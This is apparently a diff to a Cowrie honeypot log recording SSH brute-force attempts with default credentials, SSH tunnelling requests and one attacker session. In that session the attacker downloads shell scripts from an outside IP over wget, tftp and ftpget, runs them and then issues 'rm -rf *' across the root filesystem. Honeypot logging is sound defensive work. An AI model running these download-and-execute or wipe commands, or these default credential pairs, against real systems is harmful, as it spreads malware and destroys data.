@@ -645,3 +645,252 @@
 2017-05-27T00:59:41+0000 [CowrieTelnetTransport,118377,185.188.206.99] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
 	]
 2017-05-27T00:59:41+0000 [CowrieTelnetTransport,118377,185.188.206.99] Connection lost after 129 seconds
+2017-05-27T01:00:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] got channel 'direct-tcpip' request
+2017-05-27T01:00:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] direct-tcp connection request to 98.138.112.32:25 from localhost:5556
+2017-05-27T01:00:04+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 91.218.114.137:54333 (10.8.41.81:2222) [session: fade0d68]
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] NEW KEYS
+2017-05-27T01:00:04+0000 [HoneyPotSSHTransport,133949,91.218.114.137] starting service 'ssh-userauth'
+2017-05-27T01:00:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] '1111' trying auth 'password'
+2017-05-27T01:00:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] login attempt: 15
+2017-05-27T01:00:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] login return, expect: [1111/1111]
+2017-05-27T01:00:06+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] login attempt [1111/1111] succeeded
+2017-05-27T01:00:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] '1111' authenticated with 'password'
+2017-05-27T01:00:08+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133949,91.218.114.137] starting service 'ssh-connection'
+2017-05-27T01:00:08+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] got channel 'session' request
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] channel open
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Opening TTY Log: log/tty/20170527-010008-fade0d68-0e.log
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: cd /tmp
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: cd /var/run
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: cd /mnt
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: cd /root
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: cd /
+2017-05-27T01:00:08+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] Command found: wget http://107.174.34.70/Swag.sh
+2017-05-27T01:00:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Not storing duplicate content ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Downloaded URL (http://107.174.34.70/Swag.sh) with SHA-256 ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd to dl/ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 /Swag.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: sh /Swag.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: tftp 107.174.34.70 -c get tftp1.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 107.174.34.70
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-27T01:00:08+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] FTP connect failed: host=107.174.34.70, port=21, err=[Errno 111] Connection refused
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Command found: rm -rf /Swag.sh tftp1.sh tftp2.sh ftp1.sh
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Not storing duplicate content ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd to dl/ec7bf4e7c3129f31117d7e75d756db18b31c02e32ed8f7b91c6d4afa3dc32ecd
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170527-010008-fade0d68-0e.log after 0 seconds
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-05-27T01:00:09+0000 [HTTPPageDownloader,client] sending close 0
+2017-05-27T01:00:09+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-05-27T01:00:09+0000 [SSHChannel None (118) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] remote eof
+2017-05-27T01:00:09+0000 [SSHChannel None (118) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] remote close
+2017-05-27T01:00:09+0000 [SSHChannel None (118) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] sending close 118
+2017-05-27T01:00:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] got channel 'direct-tcpip' request
+2017-05-27T01:00:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] direct-tcp connection request to 98.138.112.32:25 from localhost:5556
+2017-05-27T01:00:13+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.76.127.251:45242 (10.8.41.81:2222) [session: 93d6dffc]
+2017-05-27T01:00:13+0000 [HoneyPotSSHTransport,133950,171.76.127.251] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T01:00:13+0000 [HoneyPotSSHTransport,133950,171.76.127.251] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:13+0000 [HoneyPotSSHTransport,133950,171.76.127.251] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:13+0000 [HoneyPotSSHTransport,133950,171.76.127.251] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] remote eof
+2017-05-27T01:00:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] remote close
+2017-05-27T01:00:14+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133835,91.195.103.215] sending close 119
+2017-05-27T01:00:14+0000 [HoneyPotSSHTransport,133950,171.76.127.251] NEW KEYS
+2017-05-27T01:00:14+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.76.127.251:45247 (10.8.41.81:2222) [session: 807e95bb]
+2017-05-27T01:00:14+0000 [HoneyPotSSHTransport,133950,171.76.127.251] starting service 'ssh-userauth'
+2017-05-27T01:00:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] first time for 171.76.127.251, need: 1
+2017-05-27T01:00:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] login attempt: 1
+2017-05-27T01:00:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] login attempt [root/openelec] succeeded
+2017-05-27T01:00:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] 'root' authenticated with 'password'
+2017-05-27T01:00:18+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133950,171.76.127.251] starting service 'ssh-connection'
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133950,171.76.127.251] avatar root logging out
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133950,171.76.127.251] connection lost
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133950,171.76.127.251] Connection lost after 4 seconds
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] NEW KEYS
+2017-05-27T01:00:18+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133949,91.218.114.137] remote close
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133949,91.218.114.137] avatar 1111 logging out
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133949,91.218.114.137] connection lost
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133949,91.218.114.137] Connection lost after 14 seconds
+2017-05-27T01:00:18+0000 [HoneyPotSSHTransport,133951,171.76.127.251] starting service 'ssh-userauth'
+2017-05-27T01:00:19+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] 'usuario' trying auth 'password'
+2017-05-27T01:00:19+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt: 2
+2017-05-27T01:00:19+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:20+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt [usuario/usuario] failed
+2017-05-27T01:00:20+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.76.127.251:45263 (10.8.41.81:2222) [session: 7efdb0fe]
+2017-05-27T01:00:20+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 195.22.127.83:54284 (10.8.41.81:2222) [session: ac4f1daa]
+2017-05-27T01:00:20+0000 [HoneyPotSSHTransport,133953,195.22.127.83] Remote SSH version: SSH-2.0-sshlib-0.2
+2017-05-27T01:00:20+0000 [HoneyPotSSHTransport,133953,195.22.127.83] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:20+0000 [HoneyPotSSHTransport,133953,195.22.127.83] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:20+0000 [HoneyPotSSHTransport,133953,195.22.127.83] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:21+0000 [HoneyPotSSHTransport,133953,195.22.127.83] NEW KEYS
+2017-05-27T01:00:21+0000 [HoneyPotSSHTransport,133953,195.22.127.83] starting service 'ssh-userauth'
+2017-05-27T01:00:21+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22358
+2017-05-27T01:00:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:26+0000 [-] 'usuario' failed auth 'password'
+2017-05-27T01:00:26+0000 [-] unauthorized login: 
+2017-05-27T01:00:26+0000 [HoneyPotSSHTransport,133952,171.76.127.251] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T01:00:26+0000 [HoneyPotSSHTransport,133952,171.76.127.251] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:26+0000 [HoneyPotSSHTransport,133952,171.76.127.251] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:26+0000 [HoneyPotSSHTransport,133952,171.76.127.251] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] 'usuario' trying auth 'password'
+2017-05-27T01:00:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt: 3
+2017-05-27T01:00:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt [usuario/usuario] failed
+2017-05-27T01:00:28+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:28+0000 [-] unauthorized login: 
+2017-05-27T01:00:28+0000 [HoneyPotSSHTransport,133952,171.76.127.251] NEW KEYS
+2017-05-27T01:00:28+0000 [HoneyPotSSHTransport,133952,171.76.127.251] starting service 'ssh-userauth'
+2017-05-27T01:00:28+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.76.127.251:45295 (10.8.41.81:2222) [session: ebeb37ad]
+2017-05-27T01:00:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22359
+2017-05-27T01:00:28+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:30+0000 [-] 'usuario' failed auth 'password'
+2017-05-27T01:00:30+0000 [-] unauthorized login: 
+2017-05-27T01:00:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt: 4
+2017-05-27T01:00:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt [root/root] failed
+2017-05-27T01:00:32+0000 [HoneyPotSSHTransport,133954,171.76.127.251] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T01:00:32+0000 [HoneyPotSSHTransport,133954,171.76.127.251] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:32+0000 [HoneyPotSSHTransport,133954,171.76.127.251] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:32+0000 [HoneyPotSSHTransport,133954,171.76.127.251] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:32+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:32+0000 [-] unauthorized login: 
+2017-05-27T01:00:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22360
+2017-05-27T01:00:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:33+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:33+0000 [-] unauthorized login: 
+2017-05-27T01:00:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] 'usuario' trying auth 'password'
+2017-05-27T01:00:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt: 5
+2017-05-27T01:00:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt [usuario/usuario] failed
+2017-05-27T01:00:35+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:35+0000 [-] unauthorized login: 
+2017-05-27T01:00:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133833,91.195.103.200] got channel 'direct-tcpip' request
+2017-05-27T01:00:35+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,133833,91.195.103.200] direct-tcp connection request to 23.5.96.14:443 from localhost:5556
+2017-05-27T01:00:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22361
+2017-05-27T01:00:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:37+0000 [-] 'usuario' failed auth 'password'
+2017-05-27T01:00:37+0000 [-] unauthorized login: 
+2017-05-27T01:00:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt: 6
+2017-05-27T01:00:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt [root/admin] failed
+2017-05-27T01:00:39+0000 [HoneyPotSSHTransport,133954,171.76.127.251] NEW KEYS
+2017-05-27T01:00:39+0000 [HoneyPotSSHTransport,133954,171.76.127.251] starting service 'ssh-userauth'
+2017-05-27T01:00:39+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133833,91.195.103.200] direct-tcp forward to 23.5.96.14:443 with data '\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80l\x06\xceJ\xaa\x8b\xed\x16(x\xa8z\xf5Y\xa3rf\xd8\x18X\xae\x92\xd7\x03\x1c&y2\x14\xf4\x00\xcc'
+2017-05-27T01:00:39+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133833,91.195.103.200] failed to connect: Connection refused
+2017-05-27T01:00:39+0000 [SSHChannel None (32) on SSHService 'ssh-connection' on HoneyPotSSHTransport,133833,91.195.103.200] sending close 32
+2017-05-27T01:00:39+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:39+0000 [-] unauthorized login: 
+2017-05-27T01:00:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22362
+2017-05-27T01:00:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:41+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:41+0000 [-] unauthorized login: 
+2017-05-27T01:00:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt: 7
+2017-05-27T01:00:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt [root/password] failed
+2017-05-27T01:00:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] 'usuario' trying auth 'password'
+2017-05-27T01:00:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt: 8
+2017-05-27T01:00:43+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt [usuario/usuario] failed
+2017-05-27T01:00:44+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:44+0000 [-] unauthorized login: 
+2017-05-27T01:00:44+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:44+0000 [-] unauthorized login: 
+2017-05-27T01:00:44+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 171.76.127.251:45356 (10.8.41.81:2222) [session: f691f575]
+2017-05-27T01:00:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22363
+2017-05-27T01:00:44+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:46+0000 [-] 'usuario' failed auth 'password'
+2017-05-27T01:00:46+0000 [-] unauthorized login: 
+2017-05-27T01:00:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt: 9
+2017-05-27T01:00:46+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt [root/0000] failed
+2017-05-27T01:00:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt: 10
+2017-05-27T01:00:48+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:49+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133954,171.76.127.251] login attempt [root/000000] failed
+2017-05-27T01:00:50+0000 [HoneyPotSSHTransport,133955,171.76.127.251] Remote SSH version: SSH-2.0-sshlib-0.1
+2017-05-27T01:00:50+0000 [HoneyPotSSHTransport,133955,171.76.127.251] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-dss'
+2017-05-27T01:00:50+0000 [HoneyPotSSHTransport,133955,171.76.127.251] outgoing: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:50+0000 [HoneyPotSSHTransport,133955,171.76.127.251] incoming: 'aes128-cbc' 'hmac-md5' 'none'
+2017-05-27T01:00:50+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:50+0000 [-] unauthorized login: 
+2017-05-27T01:00:50+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:50+0000 [-] unauthorized login: 
+2017-05-27T01:00:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] 'root' trying auth 'password'
+2017-05-27T01:00:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt: 22364
+2017-05-27T01:00:50+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login return, expect: [support/support]
+2017-05-27T01:00:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133953,195.22.127.83] login attempt [root/openelec] failed
+2017-05-27T01:00:51+0000 [-] 'root' failed auth 'password'
+2017-05-27T01:00:51+0000 [-] unauthorized login: 
+2017-05-27T01:00:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] 'root' trying auth 'password'
+2017-05-27T01:00:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt: 11
+2017-05-27T01:00:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login return, expect: [root/openelec]
+2017-05-27T01:00:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133952,171.76.127.251] login attempt [root/root] failed
+2017-05-27T01:00:53+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] 'usuario' trying auth 'password'
+2017-05-27T01:00:54+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,133951,171.76.127.251] login attempt: 12
